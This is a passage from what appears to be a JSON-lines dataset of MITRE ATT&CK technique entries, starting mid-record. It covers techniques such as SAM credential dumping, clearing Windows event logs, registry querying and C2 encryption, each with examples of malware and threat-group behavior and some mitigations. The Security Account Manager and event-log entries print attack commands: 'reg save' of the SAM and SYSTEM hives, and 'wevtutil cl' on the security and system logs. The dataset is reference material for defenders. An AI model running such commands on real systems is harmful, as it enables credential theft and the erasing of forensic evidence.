used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports.", "Lucifer can identify the IP and port numbers for all remote connections from the compromised host.", "Threat Group-3390 has used <code>net use</code> to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.", "Cobalt Strike can produce a sessions report from compromised hosts.", "Dtrack can collect network and active connection information.", "QakBot can use <code>netstat</code> to enumerate current network connections.", "Trojan.Karagany can use netstat to collect a list of network connections.", "APT1 used the <code>net use</code> command to get a listing on network connections.", "RedLeaves can enumerate drives and Remote Desktop sessions.", "Ke3chang performs local network connection discovery using <code>netstat</code>.", "Conti can enumerate routine network connections from a compromised host.", "APT3 has a tool that can enumerate current network connections.", "Aria-body has the ability to gather TCP and UDP table status listings.", "Poseidon Group obtains and saves information about victim network interfaces and addresses.", "SpeakUp uses the <code>arp -a</code> command. ", "Babuk can use “WNetOpenEnumW” and “WNetEnumResourceW” to enumerate files in network resources for encryption.", "Okrum was seen using NetSess to discover NetBIOS sessions.", "jRAT can list network connections.", "TeamTNT runs <code>netstat -anp</code> to search for rival malware connections. TeamTNT has also used libprocesshider to modify <code>/etc/ld.so.preload</code>.", "menuPass has used <code>net use</code> to conduct connectivity checks to machines.", "RATANKBA uses <code>netstat -ano</code> to search for specific IP address ranges.", "OSInfo enumerates the current network connections similar to <code> net use </code>.", "Tropic Trooper has tested if the localhost network is available and other connection capability on an infected system using command scripts.\t", "Kwampirs collects a list of active and listening connections by using the command <code>netstat -nao</code> as well as a list of available network mappings with <code>net use</code>.", "USBferry can use <code>netstat</code> and <code>nbtstat</code> to detect active network connections.\t", "CrackMapExec can discover active sessions for a targeted system.", "APT38 installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.", "Egregor can enumerate all connected drives.", "Maze has used the \"WNetOpenEnumW\", \"WNetEnumResourceW”, “WNetCloseEnum” and “WNetAddConnection2W” functions to enumerate the network resources on the infected machine.", "BlackEnergy has gathered information about local network connections using netstat.", "Andariel has used the <code>netstat -naop tcp</code> command to display TCP connections on a victim's machine.", "Waterbear can use API hooks on \"GetExtendedTcpTable\" to retrieve a table containing a list of TCP endpoints available to the application. ", "PoshC2 contains an implementation of netstat to enumerate TCP and UDP connections.", "APT32 used the <code>netstat -anpo tcp</code> command to display TCP connections on the victim's machine.", "GALLIUM used <code>netstat -oan</code> to obtain information about the victim network connections.", "OilRig has used <code>netstat -an</code> on a victim to get a listing of network connections.", "Sliver can collect network connection information.", "PlugX has a module for enumerating TCP and UDP network connections and associated processes using the <code>netstat</code> command.", "Comnie executes the <code>netstat -ano</code> command.", "ShimRatReporter used the Windows function <code>GetExtendedUdpTable</code> to detect connected UDP endpoints.", "SLOTHFULMEDIA can enumerate open ports on a victim machine.", "nbtstat can be used to discover current NetBIOS sessions."], "is_subtechnique": false}
{"text": " Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal. For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).", "idx": "https://attack.mitre.org/techniques/T1573/002", "title": "Asymmetric Cryptography", "entity": "Asymmetric Cryptography", "entity_type": "techniques", "entity_context": ["Pay2Key has used RSA encrypted communications with C2.", "Bazar can use TLS in C2 communications.", "Zebrocy uses SSL and AES ECB for encrypting C2 communications. ", "FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.", "Kobalos's authentication and key exchange is performed using RSA-512. ", "Sykipot uses SSL for encrypting C2 communications.", "ServHelper may set up a reverse SSH tunnel to give the attacker access to services running on the victim, such as RDP.", "OilRig used the Plink utility and other tools to create tunnels to C2 servers.", "WellMail can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.", "WannaCry uses Tor for command and control traffic and routes a custom cryptographic protocol over the Tor circuit.", "Attor's Blowfish key is encrypted with a public RSA key.", "Grandoreiro can use SSL in C2 communication.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "REvil has encrypted C2 communications with the ECIES algorithm.", "POWERSTATS has encrypted C2 traffic with RSA.", "Trojan.Karagany can secure C2 communications with SSL and TLS.", "A variant of ADVSTORESHELL encrypts some C2 with RSA.", "XTunnel uses SSL/TLS and RC4 to encrypt traffic.", "SombRAT can SSL encrypt C2 traffic.", "SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols.", "Gazer uses custom encryption for C2 that uses RSA.", "StrongPity has encrypted C2 traffic using SSL/TLS.", "IcedID has used SSL and TLS in communications with C2.", "Empire can use TLS to encrypt its C2 channel.", "Metamorfo's C2 communication has been encrypted using OpenSSL. ", "Hi-Zor encrypts C2 traffic with TLS.", "Operation Wocao's proxy implementation \"Agent\" can upgrade the socket in use to a TLS socket.", "Cobalt Group has used the Plink utility to create SSH tunnels.", "PoetRAT used TLS to encrypt command and control (C2) communications.", "Pupy's default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.", "adbupd contains a copy of the OpenSSL library to encrypt C2 traffic.", "GreyEnergy encrypts communications using RSA-2048.", "Tropic Trooper has used SSL to connect to C2 servers.", "BISCUIT uses SSL for encrypting C2 communications.", "Sliver can use mutual TLS and RSA  cryptography to exchange a session key.", "ComRAT can use SSL/TLS encryption for its HTTP-based C2 channel. ComRAT has used public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel. ", "CHOPSTICK encrypts C2 communications with TLS.", "Cobalt Strike can use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server.", "WellMess can communicate to C2 with mutual TLS where client and server mutually check certificates.", "GrimAgent can use a hardcoded server public RSA key to encrypt the first request to C2.", "Penquin can encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman.", "FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure.", "Doki has used the embedTLS library for network communications.", "Some Volgmer variants use SSL to encrypt C2 communications.", "GoldMax has RSA-encrypted its communication with the C2 server.", "Tor encapsulates traffic in multiple layers of encryption, using TLS by default.", "POSHSPY encrypts C2 traffic with AES and RSA.", "Carbon has used RSA encryption for C2 communications.", "SodaMaster can use a hardcoded RSA key to encrypt some of its C2 traffic.", "Dridex has encrypted traffic with RSA.", "Koadic can use SSL and TLS for communications.", "Emotet is known to use RSA keys for encrypting C2 traffic. ", "Machete has used TLS-encrypted FTP to exfiltrate data."], "is_subtechnique": true}
{"text": " Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.", "idx": "https://attack.mitre.org/techniques/T1587/002", "title": "Code Signing Certificates", "entity": "Code Signing Certificates", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "PROMETHIUM has created self-signed certificates to sign malicious installers.", "Patchwork has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware."], "is_subtechnique": true}
{"text": " Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009) Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)", "idx": "https://attack.mitre.org/techniques/T1006", "title": "Direct Volume Access", "entity": "Direct Volume Access", "entity_type": "techniques", "entity_context": [], "is_subtechnique": false}
{"text": " Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking) Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).", "idx": "https://attack.mitre.org/techniques/T1593/002", "title": "Search Engines", "entity": "Search Engines", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018) Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018) Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)", "idx": "https://attack.mitre.org/techniques/T1134/004", "title": "Parent PID Spoofing", "entity": "Parent PID Spoofing", "entity_type": "techniques", "entity_context": ["Cobalt Strike can spawn processes with alternate PPIDs.", "PipeMon can use parent PID spoofing to elevate privileges."], "is_subtechnique": true}
{"text": " Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking. Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.", "idx": "https://attack.mitre.org/techniques/T1542/002", "title": "Component Firmware", "entity": "Component Firmware", "entity_type": "techniques", "entity_context": ["Prevent adversary access to privileged accounts or access necessary to perform this technique.\n\nConsider removing and replacing system components suspected of being compromised.", "Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers. "], "is_subtechnique": true}
{"text": " Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems. Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands: * ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. * ExecReload directive covers when a service restarts. * ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'. Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.(Citation: Anomali Rocke March 2019) While adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level", "idx": "https://attack.mitre.org/techniques/T1543/002", "title": "Systemd Service", "entity": "Systemd Service", "entity_type": "techniques", "entity_context": ["Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.", "Hildegard has started a monero service.", "Rocke has installed a systemd service script to maintain persistence.\t", "Fysbis has established persistence using a systemd service.", "Restrict read/write access to systemd unit files to only select privileged users who have a legitimate need to manage system services.", "TeamTNT has established persistence through the creation of a cryptocurrency mining system service.", "Limit user access to system utilities such as 'systemctl' to only users who have a legitimate need.", "Restrict software installation to trusted repositories only and be cautious of orphaned software packages.", "The creation and modification of systemd service unit files is generally reserved for administrators such as the Linux root user and other users with superuser privileges. ", "Pupy can be used to establish persistence using a systemd service."], "is_subtechnique": true}
{"text": " Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit. The event logs can be cleared with the following utility commands: * <code>wevtutil cl system</code> * <code>wevtutil cl application</code> * <code>wevtutil cl security</code> These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001).", "idx": "https://attack.mitre.org/techniques/T1070/001", "title": "Clear Windows Event Logs", "entity": "Clear Windows Event Logs", "entity_type": "techniques", "entity_context": ["KillDisk deletes Application, Security, Setup, and System Windows Event Logs.", "Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.", "APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events.", "Wevtutil can be used to clear system and security event logs from the system.", "Lucifer can clear and remove event logs.", "FIN8 has cleared logs during post compromise cleanup activities.", "NotPetya uses <code>wevtutil</code> to clear the Windows event logs.", "FIN5 has cleared event logs from victims.", "APT38 clears Window Event logs and Sysmon logs from the system.", "Hydraq creates a backdoor through which remote attackers can clear all system event logs.", "Pupy has a module to clear event logs with PowerShell.", "Operation Wocao has deleted Windows Event Logs to hinder forensic investigation.", "APT32 has cleared select event log entries.", "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities.", "Olympic Destroyer will attempt to clear the System and Security event logs using <code>wevtutil</code>.", "gh0st RAT is able to wipe event logs.", "Chimera has cleared event logs on compromised hosts.", "APT28 has cleared event logs, including by using the commands <code>wevtutil cl System</code> and <code>wevtutil cl Security</code>.", "Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system.", "Dragonfly 2.0 cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.", "The BlackEnergy component KillDisk is capable of deleting Windows Event Logs.", "ZxShell has a command to clear system event logs. ", "FinFisher clears the system event logs using <code> OpenEventLog/ClearEventLog APIs </code>.", "Indrik Spider has used Cobalt Strike to empty log files.", "RunningRAT contains code to clear event logs.", "SynAck clears event logs."], "is_subtechnique": true}
{"text": " Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services. A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.", "idx": "https://attack.mitre.org/techniques/T1566/003", "title": "Spearphishing via Service", "entity": "Spearphishing via Service", "entity_type": "techniques", "entity_context": ["Windshift has used fake personas on social media to engage and target victims.\t", "FIN6 has used fake job advertisements sent via LinkedIn to spearphish targets.", "Anti-virus can also automatically quarantine suspicious files.", "Ajax Security Team has used various social media channels to spearphish victims.", "Determine if certain social media sites, personal webmail services, or other service that can be used for spearphishing is necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.", "Users can be trained to identify social engineering techniques and spearphishing messages with malicious links.", "Dark Caracal spearphished victims via Facebook and Whatsapp.", "Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.", "APT29 has used the legitimate mailing service Constant Contact to send phishing e-mails.\n", "OilRig has used LinkedIn to send spearphishing links."], "is_subtechnique": true}
{"text": " Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access. A number of tools can be used to retrieve the SAM file through in-memory techniques: * pwdumpx.exe * [gsecdump](https://attack.mitre.org/software/S0008) * [Mimikatz](https://attack.mitre.org/software/S0002) * secretsdump.py Alternatively, the SAM can be extracted from the Registry with Reg: * <code>reg save HKLM\\sam sam</code> * <code>reg save HKLM\\system system</code> Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7) Notes: * RID 500 account is the local, built-in administrator. * RID 501 is the guest account. * User accounts start with a RID of 1,000+.", "idx": "https://attack.mitre.org/techniques/T1003/002", "title": "Security Account Manager", "entity": "Security Account Manager", "entity_type": "techniques", "entity_context": ["SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the SAM table.", "Ensure that local administrator accounts have complex, unique passwords across all systems on the network.", "GALLIUM used <code>reg</code> commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.", "POWERTON has the ability to dump password hashes.", "Remsec can dump the SAM database.", "Ke3chang has dumped credentials, including by using gsecdump.", "Dragonfly 2.0 dropped and executed SecretsDump to dump password hashes.", "Cobalt Strike can recover hashed passwords.", "Fgdump can dump Windows password hashes.", "gsecdump can dump Windows password hashes from the SAM.", "Mivast has the capability to gather NTLM password information.", "CosmicDuke collects Windows account hashes.", "HOPLIGHT has the capability to harvest credentials and passwords from the SAM database.\t", "Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.", "CrackMapExec can dump usernames and hashed passwords from the SAM.", "pwdump can be used to dump credentials from the SAM.", "Wizard Spider has acquired credentials from the SAM/SECURITY registry hives.", "Koadic can gather hashed passwords by dumping SAM/SECURITY hive.", "Night Dragon has dumped account hashes with Carbanak and cracked them with Cain & Abel.", "Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.", "Consider disabling or restricting NTLM.", "Password stealer and NTLM stealer modules in CozyCar harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.", "menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.", "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."], "is_subtechnique": true}
{"text": " Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software. The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "idx": "https://attack.mitre.org/techniques/T1012", "title": "Query Registry", "entity": "Query Registry", "entity_type": "techniques", "entity_context": ["Turla surveys a system upon check-in to discover information in the Windows Registry with the <code>reg query</code> command. Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .", "Epic uses the <code>rem reg query</code> command to obtain values from Registry keys.", "Sibot has queried the registry for proxy server information.", "A Threat Group-3390 tool can read and decrypt stored Registry values.", "FatDuke can get user agent strings for the default browser from <code>HKCU\\Software\\Classes\\http\\shell\\open\\command</code>.", "Zebrocy executes the <code>reg query</code> command to obtain information in the Registry.", "RATANKBA uses the command <code>reg query “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings”</code>.", "Stuxnet searches the Registry for indicators of security programs.", "Dtrack can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.", "WINDSHIELD can gather Registry values.", "DownPaper searches and reads the value of the Windows Update Registry Run key.", "Azorult can check for installed software on the system under the Registry key <code>Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall</code>.", "Cobalt Strike can query <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\</code>  to determine if the security setting for restricting default programmatic access is enabled.", "Cardinal RAT contains watchdog functionality that periodically ensures <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> is set to point to its executable.", "Operation Wocao has queried the registry to detect recent PuTTY sessions.", "Valak can use the Registry for code updates and to collect credentials.", "CHOPSTICK provides access to the Windows Registry, which can be used to gather information.", "njRAT can read specific registry values.", "Carbon enumerates values in the Registry.", "ZxShell can query the netsvc group value data located in the svchost group Registry key. ", "BACKSPACE is capable of enumerating and making modifications to an infected system's Registry.", "ZIRCONIUM has used a tool to query the Registry for proxy settings.", "Bazar can query <code>Windows\\CurrentVersion\\Uninstall</code> for installed applications.", "SUNBURST collected the registry value <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid</code> from compromised hosts.", "Zeus Panda checks for the existence of a Registry key and if it contains certain values.", "Crimson can check the Registry for the presence of <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate</code> to determine how long it has been installed on a host.", "Denis queries the Registry for keys and values.", "Bankshot searches for certain Registry keys to be configured before executing the payload.", "Derusbi is capable of enumerating Registry keys and values.", "StoneDrill has looked in the registry to find the default browser path.", "APT39 has used various strains of malware to query the Registry.", "Lucifer can check for existing stratum cryptomining information in <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr – %stratum info%</code>.", "ComRAT can check the default browser by querying <code>HKCR\\http\\shell\\open\\command</code>.", "gh0st RAT has checked for the existence of a Service key to determine if it has already been installed on the system.", "Industroyer has a data wiper component that enumerates keys in the Registry <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services</code>.", "LiteDuke can query the Registry to check for the presence of <code>HKCU\\Software\\KasperskyLab</code>.", "Shamoon queries several Registry keys to identify hard disk partitions to overwrite.", "Gold Dragon enumerates registry keys with the command <code>regkeyenum</code> and obtains information for the Registry key <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.", "FinFisher queries Registry values as part of its anti-sandbox checks.", "A variant of HOPLIGHT hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key <code>SYSTEM\\CurrentControlSet\\Control\\Lsa Name</code>.", "PowerSploit contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.", "Fox Kitten has accessed Registry hives ntuser.dat and UserClass.dat.", "OSInfo queries the registry to look for information about Terminal Services.", "Chimera has queried Registry keys using <code>reg query \\\\<host>\\HKU\\<SID>\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers</code> and <code>reg query \\\\<host>\\HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings</code>.", "BabyShark has executed the <code>reg query</code> command for <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>.\t", "Dragonfly 2.0 queried the Registry to identify victim information.", "SynAck enumerates Registry keys associated with event logs.", "Carberp has searched the Image File Execution Options registry key for \"Debugger\" within every subkey.", "Ursnif has used Reg to query the Registry for installed programs.", "APT32's backdoor can query the Windows Registry to gather system information. ", "Taidoor can query the Registry on compromised hosts using <code>RegQueryValueExA</code>.", "Waterbear can query the Registry to retrieve data.", "POWRUNER may query the Registry by running <code>reg query</code> on a victim.", "Reaver queries the Registry to determine the correct Startup path to use for persistence.", "TEARDROP checked that <code>HKU\\SOFTWARE\\Microsoft\\CTF</code> existed before decoding its embedded payload. ", "ADVSTORESHELL can enumerate registry keys.", "Carbanak checks the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings</code> for proxy configurations information.", "SodaMaster has the ability to query the Registry to detect a key specific to VMware.", "Proxysvc gathers product names from the Registry key: <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName</code> and the processor description from the Registry key <code>HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString</code>.", "Volgmer checks the system for certain Registry keys.", "Pillowmint has used shellcode which reads code stored in the registry keys <code>\\REGISTRY\\SOFTWARE\\Microsoft\\DRM</code> using the native Windows API as well as read <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces</code> as part of its C2.\t", "InvisiMole can enumerate Registry values, keys, and data.", "ROKRAT accesses the <code>HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData</code> Registry key to obtain the System manufacturer value to identify the machine type.", "OilRig has used <code>reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default”</code> on a victim to query the Registry.", "Brave Prince gathers information about the Registry.", "QUADAGENT checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.", "Hydraq creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.", "FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information. FELIXROOT has also used WMI to query the Windows Registry.", "Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry.", "BendyBear can query the host's Registry key at <code>HKEY_CURRENT_USER\\Console\\QuickEdit</code> to retrieve data.", "Reg may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.", "PlugX can enumerate and query for information contained within the Windows Registry.", "Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:<code>HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt</code>.", "BitPaymer can use the RegEnumKeyW to iterate through Registry keys. ", "JPIN can enumerate Registry keys.", "WastedLocker checks for specific registry keys related to the <code>UCOMIEnumConnections</code> and <code>IActiveScriptParseProcedure32</code> interfaces.", "REvil can query the Registry to get random file extensions to append to encrypted files.", "Attor has opened the registry and performed query searches.", "POWERSOURCE queries Registry keys in preparation for setting Run keys to achieve persistence."], "is_subtechnique": false}
{"text": " Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations. By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)", "idx": "https://attack.mitre.org/techniques/T1584/002", "title": "DNS Server", "entity": "DNS Server", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
